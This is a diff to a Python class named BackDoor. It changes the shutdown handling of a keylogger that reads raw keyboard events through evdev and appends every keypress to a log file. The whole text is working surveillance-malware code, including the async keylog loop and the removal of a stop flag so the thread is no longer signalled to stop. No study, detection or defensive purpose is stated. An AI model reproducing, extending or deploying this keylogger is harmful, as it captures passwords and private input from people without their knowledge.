@@ -141,7 +141,7 @@ class BackDoor:
         self.watch_dir = ""
         self.watch_file = ""
         self.watch_status = False
-        self.flag = False
+
 
     def start(self):
         self.process_yaml()
@@ -163,8 +163,6 @@ class BackDoor:
         except KeyboardInterrupt as e:
             observer.stop()
             observer.join()
-            self.flag = True # Set the flag to stop the keylogger thread
-            keylog_t.join()
             sys.exit(" Closed")
         except FileNotFoundError as e:
             sys.exit(" Closed")
@@ -174,13 +172,14 @@ class BackDoor:
         device = InputDevice(self.device)
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(self.keylog(device))
+        try:
+            loop.run_until_complete(self.keylog(device))
+        except KeyboardInterrupt:
+            sys.exit()
 
     async def keylog(self, device):
         with open(self.log, 'a+') as f:
             async for event in device.async_read_loop():
-                if self.flag:
-                    break
                 if event.type == ecodes.EV_KEY and event.value == 1:
                     try:
                         f.write(key_code_map[event.code])
